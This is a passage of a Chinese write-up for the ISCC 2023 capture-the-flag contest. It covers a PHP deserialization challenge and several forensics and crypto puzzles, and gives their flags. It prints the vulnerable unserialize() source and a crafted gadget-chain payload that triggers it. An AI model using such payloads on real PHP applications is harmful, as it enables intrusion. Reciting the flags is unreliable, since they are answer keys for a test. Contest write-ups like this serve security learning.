+<span class="line" data-line="9"><span style="color:#E1E4E8">        $e </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> sprintf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"%02x"</span><span style="color:#E1E4E8">, $c);</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">        $str </span><span style="color:#F97583">.=</span><span style="color:#E1E4E8"> $e;</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> $str;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>访问 <code>LoveStory.php</code> 得到一段反序列化代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">include</span><span style="color:#9ECBFF"> "./xxxiscc.php"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> boy</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $like;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "能请你喝杯奶茶吗？&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">        @</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#B392F0">make_friends</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __toString</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "拱火大法好&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">string;</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">class</span><span style="color:#B392F0"> girl</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $boyname;</span></span>
+<span class="line" data-line="20"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __call</span><span style="color:#E1E4E8">($func, $args)</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="22"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "我害羞羞&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="23"><span style="color:#79B8FF">        isset</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">boyname</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">name);</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="26"><span style="color:#F97583">class</span><span style="color:#B392F0"> helper</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="28"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $name;</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $string;</span></span>
+<span class="line" data-line="30"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($string)</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="32"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">string </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $string;</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="34"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __isset</span><span style="color:#E1E4E8">($val)</span></span>
+<span class="line" data-line="35"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="36"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "僚机上线&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="37"><span style="color:#79B8FF">        echo</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">name;</span></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="39"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __get</span><span style="color:#E1E4E8">($name)</span></span>
+<span class="line" data-line="40"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="41"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "僚机不懈努力&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="42"><span style="color:#E1E4E8">        $var </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">{$name};</span></span>
+<span class="line" data-line="43"><span style="color:#E1E4E8">        $var[$name]();</span></span>
+<span class="line" data-line="44"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="45"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="46"><span style="color:#F97583">class</span><span style="color:#B392F0"> love_story</span></span>
+<span class="line" data-line="47"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="48"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> love</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="49"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="50"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "爱情萌芽&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="51"><span style="color:#79B8FF">        array_walk</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">function</span><span style="color:#E1E4E8"> ($make, $colo) {</span></span>
+<span class="line" data-line="52"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "坠入爱河，给你爱的密码&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="53"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> ($make[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> "girl_and_boy"</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> $colo </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> "fall_in_love"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="54"><span style="color:#F97583">                global</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="55"><span style="color:#79B8FF">                echo</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="56"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="57"><span style="color:#E1E4E8">        });</span></span>
+<span class="line" data-line="58"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="59"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="60"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">"iscc"</span><span style="color:#E1E4E8">])) {</span></span>
+<span class="line" data-line="61"><span style="color:#E1E4E8">    $a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> unserialize</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'iscc'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="62"><span style="color:#E1E4E8">} </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="63"><span style="color:#79B8FF">    highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="64"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>根据题目逻辑构造反序列化代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> boy</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $like;</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">class</span><span style="color:#B392F0"> girl</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $boyname;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#F97583">class</span><span style="color:#B392F0"> helper</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $name;</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $string;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">class</span><span style="color:#B392F0"> love_story</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $fall_in_love</span><span style="color:#F97583">=</span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'girl_and_boy'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> love</span><span style="color:#E1E4E8">() {}</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="18"></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">$flag </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> boy</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">$flag</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> girl</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">$flag</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">boyname </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> helper</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="22"><span style="color:#E1E4E8">$flag</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">boyname</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">name </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> boy</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">$flag</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">boyname</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">name</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> helper</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">$flag</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">boyname</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">name</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">like</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">string[</span><span style="color:#9ECBFF">'string'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#79B8FF"> love_story</span><span style="color:#E1E4E8">(),</span><span style="color:#9ECBFF">'love'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="25"><span style="color:#79B8FF">var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($flag));</span></span>
+<span class="line" data-line="26"><span style="color:#6A737D">// O:3:"boy":1:{s:4:"like";O:4:"girl":1:{s:7:"boyname";O:6:"helper":2:{s:4:"name";O:3:"boy":1:{s:4:"like";O:6:"helper":2:{s:4:"name";N;s:6:"string";a:1:{s:6:"string";a:2:{i:0;O:10:"love_story":1:{s:12:"fall_in_love";a:1:{i:0;s:12:"girl_and_boy";}}i:1;s:4:"love";}}}}s:6:"string";N;}}}</span></span></code></pre>
+<p>然后我们根据前面得到的加密函数，反写出解密函数即可得到 flag</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">function</span><span style="color:#B392F0"> dec</span><span style="color:#E1E4E8">($data){</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">    $str</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    for</span><span style="color:#E1E4E8">($i</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">;$i</span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF">strlen</span><span style="color:#E1E4E8">($data);$i</span><span style="color:#F97583">+=</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">        $c</span><span style="color:#F97583">=</span><span style="color:#79B8FF">hexdec</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($data,$i,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">        $b</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$c</span><span style="color:#F97583">^</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">        $a</span><span style="color:#F97583">=</span><span style="color:#79B8FF">chr</span><span style="color:#E1E4E8">($b</span><span style="color:#F97583">-</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        $str</span><span style="color:#F97583">.=</span><span style="color:#E1E4E8">$a;</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_rot13</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">strrev</span><span style="color:#E1E4E8">($str));</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="12"></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">$c </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'e33a1f1a10e6e73f005958260b1b18595a5839245b3d153b335ee43014355f073ce13e3e3404'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">dec</span><span style="color:#E1E4E8">($c));</span></span>
+<span class="line" data-line="15"><span style="color:#6A737D">// ISCC{G83D7S5ZlNy6FMgB4xfwb41h1PiCne6O}</span></span></code></pre>
+<h2 id="misc">Misc</h2>
+<h3 id="好看的维吾尔族小姐姐">好看的维吾尔族小姐姐</h3>
+<blockquote>
+<p>五十六个民族，五十六支花，五十六个兄弟姐妹是一家。现如今，民族团结的思想早已深入人心，而维吾尔族又是中华民族的重要组成部分，解决本题需要各位解题人知晓维吾尔族同胞的说话方式。</p>
+</blockquote>
+<p>下载附件得到一个无后缀的 <code>古力娜扎</code> 文件，使用 <code>16</code> 进制编辑器发现是 <code>PNG</code> 文件，手动修改文件后，感觉图片缺半截，直接爆破得到正确宽高</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>CRC32: 0x52084bfb</span></span>
+<span class="line" data-line="2"><span>宽度: 474, hex: 0x1da</span></span>
+<span class="line" data-line="3"><span>高度: 667, hex: 0x29b</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530171655400.png" alt="image-20230530171655400"></p>
+<p>将下面的码左右翻转后解 <a href="https://jie.2weima.com/datamatrix.html">datamatrix</a>， 然后再 <code>reverse</code>，最后 <code>html实体</code> 即可得到 <code>flag</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>ISCC{you_got_it_welldone!}</span></span></code></pre>
+<h3 id="菜鸟黑客1">菜鸟黑客1</h3>
+<blockquote>
+<p>找出菜鸟黑客小明留下的flag文件</p>
+</blockquote>
+<p>一开始通过 <code>volatility</code> 找到了桌面存在 <code>flag.txt</code> 文件，但死活导出不了。直接通过 <code>DiskGenius</code> 挂载镜像导出成功，用 <code>R-Studio</code> 亦可</p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530152428422.png" alt="image-20230530152428422"></p>
+<p>根据提示盲猜密码 <code>ISCC2023</code>，同时密文部分也给了提示为 <code>DES</code> 加密，直接找个<a href="http://www.esjson.com/desEncrypt.html">在线DES解密</a></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>密文：U2FsdGVkX19WerE/OZodh7liigwc7fzf8eWqByR8ixxENEvPwPpWzm2EL2f90UXO</span></span>
+<span class="line" data-line="2"><span>密钥：ISCC2023</span></span>
+<span class="line" data-line="3"><span>FLAG：ISCC{dbsy_cdis_fd7n_s4fd}</span></span></code></pre>
+<h3 id="菜鸟黑客2">菜鸟黑客2</h3>
+<p>题目提示喜欢画画，猜测和图片有关，直接搜 <code>pic</code></p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530164657369.png" alt="image-20230530164657369"></p>
+<p>发现有个 <code>emoji.jpg</code> 直接尝试导出</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>.\volatility.exe -f '.\Novice hacker.raw' --profile Win7SP1x64 dumpfiles -Q 0x000000007dfaff20 -D ./</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530164826666.png" alt="image-20230530164826666"></p>
+<p>导出后发现一个提示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Pay Attention to emoji's eyes</span></span></code></pre>
+<p>根据这段信息，猜测为摩斯电码 ，一个眼睛就是一个 <code>.</code> 一个闭着的眼就是一个 <code>- </code> ，根据规则敲出电码进行解密</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>. -- --- .--- .. .. ... ..-. ..- -.</span></span>
+<span class="line" data-line="2"><span>// EMOJIISFUN</span></span></code></pre>
+<p>以为是 <code>flag</code> 但并不是，使用 <code>foremost</code> 分离图片得到一个加密压缩包，尝试惯用密码 <code>ISCC2023</code> 成功解压，得到一段维吉尼亚密码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。</span></span>
+<span class="line" data-line="2"><span>MEQL{invk_vhlu_dzel_lkof}</span></span></code></pre>
+<p>那没啥好说的了，直接通过上面摩斯电码解出来的内容当作 <code>key</code> 成功得到 <code>flag</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>ISCC{afdf_buhi_pqwd_tfus}</span></span></code></pre>
+<h3 id="消息传递">消息传递</h3>
+<blockquote>
+<p>消息是如何传递的呢（思考…)</p>
+</blockquote>
+<p>直接文件导出 <code>IMF</code></p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530215705197.png" alt="image-20230530215705197"></p>
+<p>进行追踪发现存在一个 <code>rar</code> 和 <code>png</code> 文件</p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230530220500356.png" alt="image-20230530220500356"></p>
+<p>我们通过 <a href="https://tool.hiofd.com/base64-to-file-online/">在线Base64转文件工具</a> 将 <code>base64</code> 编码的内容转换为文件，然后通过 foremost 分离 <code>PNG</code> 得到 <code>rar</code> 的解压密码为 password1 + password2，然后在 <code>TCP</code> 流 <code>60</code>和 <code>36</code> 得到密码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>WRWAALIUWOHZAPQWFTQIPMVJFOKHHZUZ</span></span></code></pre>
+<p>使用密码解压压缩包后得到 <code>122</code> 张黑白图片，直接 <code>白色</code> 为 <code>0</code>，反之为 <code>1</code>，然后转为十进制</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#79B8FF"> PIL</span><span style="color:#F97583"> import</span><span style="color:#E1E4E8"> Image</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">113</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    filename </span><span style="color:#F97583">=</span><span style="color:#F97583"> f</span><span style="color:#9ECBFF">"./</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">i</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">.png"</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> os.path.isfile(filename):</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">        image </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Image.open(filename)</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        image </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> image.convert(</span><span style="color:#9ECBFF">"L"</span><span style="color:#E1E4E8">)  </span><span style="color:#6A737D"># 转换为灰度图像</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">        pixels </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> list</span><span style="color:#E1E4E8">(image.getdata())</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">        if</span><span style="color:#79B8FF"> all</span><span style="color:#E1E4E8">(pixel </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 255</span><span style="color:#F97583"> for</span><span style="color:#E1E4E8"> pixel </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> pixels):</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="14"><span style="color:#6A737D"># 010010010101001101000011010000110111101101101001001100100111001100110000011000110011001001100011001100110111101</span></span>
+<span class="line" data-line="15"><span style="color:#6A737D"># ISCC{i2s0c2c3}</span></span>
+<span class="line" data-line="16"><span style="color:#6A737D"># 但是根据常规flag格式把末尾的=替换为}</span></span>
+<span class="line" data-line="17"><span style="color:#6A737D"># ISCC{i2s0c2c3}</span></span></code></pre>
+<p>然后我们根据最初附件内提供的 <code>dictionary.txt</code> ，进行匹配替换即可得到最终 <code>flag</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">dictionary </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'./dictionary.txt'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'r'</span><span style="color:#E1E4E8">).read().split(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">dict1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {}</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> pair </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> dictionary:</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    key, value </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pair.split(</span><span style="color:#9ECBFF">':'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    dict1[key] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> value</span></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(dict1)</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">message</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"ISCC</span><span style="color:#79B8FF">{i2s0c2c3}</span><span style="color:#9ECBFF">"</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(dict1.get(i),</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> dict1 </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> print</span><span style="color:#E1E4E8">(i,</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> message ]</span></span></code></pre>
+<h3 id="你相信ai吗">你相信AI吗？</h3>
+<blockquote>
+<p>经典的算法，经典的数据，但也许会出现不一样的结果？</p>
+</blockquote>
+<p>一开始有非预期，<code>32</code> 个文件，通过读取文件内容，可以得到手写数字，然后根据数字结果进行爆破即可。后来修复了，变为了 <code>80</code>个文件加爆破出来的结果为 <code>Base64</code> 编码 <code>4</code> 此后的内容，不过依旧算是非预期。</p>
